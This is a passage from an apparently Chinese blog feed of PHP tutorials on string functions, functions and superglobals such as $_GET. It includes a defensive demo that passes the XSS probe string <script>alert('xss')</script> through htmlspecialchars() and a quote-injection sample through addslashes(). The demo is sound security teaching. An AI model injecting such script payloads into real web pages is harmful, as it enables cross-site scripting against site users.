delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="stripos"><a href="#stripos" class="headerlink" title="stripos()"></a>stripos()</h5><p>它跟上面函数的区别就是区分大小写，它不区分，它上面的区分</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"editor.csdn.com"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'北京'</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string">'Csdn'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string">'Csdn'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031155738413.png#pic_center" alt="在这里插入图片描述"></p><h5 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h5><p>这个函数在很多代码级的防护上都有出现，效果就是字符串替换，这个函数跟strpos()一样，区分大小写，而str_ireplace()不区分大小写：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"editor.csdn.com"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'北京'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//将字符串a中的csdn替换成baidu并把结果赋值给c</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'csdn'</span><span class="token punctuation">,</span> <span class="token string">'baidu'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$a"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$c"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031203304750.png#pic_center" alt="在这里插入图片描述"></p><h5 id="strstr"><a href="#strstr" class="headerlink" title="strstr()"></a>strstr()</h5><p>这个函数的作用是查找字符串的首次出现 ：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$email</span>   <span class="token operator">=</span>  <span class="token string">'username@example.com'</span> <span class="token punctuation">;</span><span class="token variable">$domain</span>  <span class="token operator">=</span>  <span class="token function">strstr</span> <span class="token punctuation">(</span> <span class="token variable">$email</span> <span class="token punctuation">,</span>  <span class="token string">'@'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$domain</span> <span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 打印 @example.com</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 从 PHP 5.3.0 起，参数true返回条件前的字符串，不包含条件，false返回条件后的字符串，包含条件</span><span class="token variable">$user</span>  <span class="token operator">=</span>  <span class="token function">strstr</span> <span class="token punctuation">(</span> <span class="token variable">$email</span> <span class="token punctuation">,</span>  <span class="token string">'@'</span> <span class="token punctuation">,</span>  <span class="token boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span>  <span class="token variable">$user</span> <span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 打印 name</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h5><p>这个函数的作用是截取字符串，比如我们要截取username这个字符串，他就是从0开始，长度为8的一个条件，我们按照这个条件来截取即可</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$email</span>   <span class="token operator">=</span>  <span class="token string">'username@example.com'</span> <span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$email</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$str"</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031204837867.png#pic_center" alt="在这里插入图片描述"></p><h5 id="explode"><a href="#explode" class="headerlink" title="explode()"></a>explode()</h5><p>这个函数类似于Python中的split()函数，按条件分割字符串并以数组的形式保存：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$website</span> <span class="token operator">=</span> <span class="token string">'www.qq.com'</span> <span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token variable">$website</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031205950824.png#pic_center" alt="在这里插入图片描述"></p><h5 id="implode"><a href="#implode" class="headerlink" title="implode()"></a>implode()</h5><p>这个函数刚好与explode()对应，它的作用是把数组以某种条件拼接成一串字符串：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$array</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string">'lastname'</span> <span class="token punctuation">,</span>  <span class="token string">'email'</span> <span class="token punctuation">,</span>  <span class="token string">'phone'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$comma_separated</span>  <span class="token operator">=</span>  <span class="token function">implode</span> <span class="token punctuation">(</span> <span class="token string">","</span> <span class="token punctuation">,</span>  <span class="token variable">$array</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$comma_separated</span> <span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// lastname,email,phone</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用空数组时为空字符串</span> <span class="token function">var_dump</span> <span class="token punctuation">(</span> <span class="token function">implode</span> <span class="token punctuation">(</span> <span class="token string">'hello'</span> <span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// string(0) ""</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031210705797.png#pic_center" alt="在这里插入图片描述"></p><h5 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h5><p>这个函数对应Python中的strip()函数，用于去除字符串头尾的空格或其他你指定的字符：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string">'000This is test str000'</span><span class="token punctuation">;</span><span class="token variable">$newstr</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$test"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$newstr"</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031212138154.png#pic_center" alt="在这里插入图片描述"><br>如果想要去除空格的话是不需要加条件的，这个函数本身就是用来去除字符串首尾空格的，对应消除<strong>左边</strong>字符与<strong>右边</strong>字符的是<strong>rtrim()</strong>和<strong>ltrim()</strong></p><h5 id="addslashes-和htmlspecialchars"><a href="#addslashes-和htmlspecialchars" class="headerlink" title="addslashes()和htmlspecialchars()"></a>addslashes()和htmlspecialchars()</h5><p>这两个函数放到一起写是因为他俩经常用于防注入和防XSS</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031213604817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>来一段代码感受一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"admin'"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里会把admin后面的单引号转义掉：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031213927775.png#pic_center" alt="在这里插入图片描述"><br>再看一下htmlspecialchars()函数<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031214355372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>主要看下面那5条，这是他的过滤规则，我们来一个代码测试一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$search</span> <span class="token operator">=</span> <span class="token string">"&lt;script>alert('xss')&lt;/script>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$search</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>看一下源代码就知道它怎么转义的了 ：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031214620446.png#pic_center" alt="在这里插入图片描述"><br>在后面的学习中我会更详细的补充这两个函数的</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的函数与超全局变量</title>
      <link href="/posts/9c9724be.html"/>
      <url>/posts/9c9724be.html</url>
      
        <content type="html"><![CDATA[<h3 id="函数的定义格式"><a href="#函数的定义格式" class="headerlink" title="函数的定义格式"></a>函数的定义格式</h3><pre><code>function 函数名(参数1，参数2){        函数功能}</code></pre><p>例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 无参数函数</span><span class="token keyword">function</span> <span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"www.xxx.com&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"www.asdf.com&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"www.ooo.com&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"www.ccc.com&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 有参数函数</span><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token operator">*</span><span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token operator">*</span><span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">'的平方加'</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">.</span><span class="token string">'的平方等于'</span><span class="token punctuation">.</span><span class="token variable">$x</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 调用函数</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h3><p>超全局变量有很多，这里只介绍五个常用的</p><h5 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h5><p>我们var_dump一下，看看它的数据类型：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102135451867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里我们传个参试一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102141250312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h5><p>server主要输出客服端的信息与服务器的信息：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102140435110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里我们可以输出一下远程客户端的ip地址：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// var_dump($GLOBALS);</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102140952148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h5><p>get可以通过浏览器传参，也可以通过表单传参，我们先来看一下通过浏览器传参：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 定义一个计算和的函数</span><span class="token keyword">function</span> <span class="token function">GetAdd</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 判断浏览器传值是否为空，如果为空输出No Number!</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"No Number!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 如果不为空就把值分别赋给x，y</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 这里接收的两个参数必须是a，b，否则会报错</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 调用上面定义的函数，把x,y的值传进去，返回的结果赋值给add</span>    <span class="token variable">$add</span> <span class="token operator">=</span> <span class="token function">GetAdd</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$add"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102143447774.png#pic_center" alt="在这里插入图片描述"><br>t通过表单传参，我们先写一个通过GET方式提交表单的页面，让他把值传给我们计算参数的页面：</p><p>提交页面.html</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试<span class="token constant">GET</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hello.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    Username<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    Pssword<span class="token punctuation">:</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接收参数.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 定义一个计算和的函数</span><span class="token keyword">function</span> <span class="token function">GetAdd</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 判断浏览器传值是否为空，如果为空输出No Number!</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"No Number!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 如果不为空就把值分别赋给x，y</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># 这里接收的两个参数必须是a，b，否则会报错</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 调用上面定义的函数，把x,y的值传进去，返回的结果赋值给add</span>    <span class="token variable">$add</span> <span class="token operator">=</span> <span class="token function">GetAdd</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"$add"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 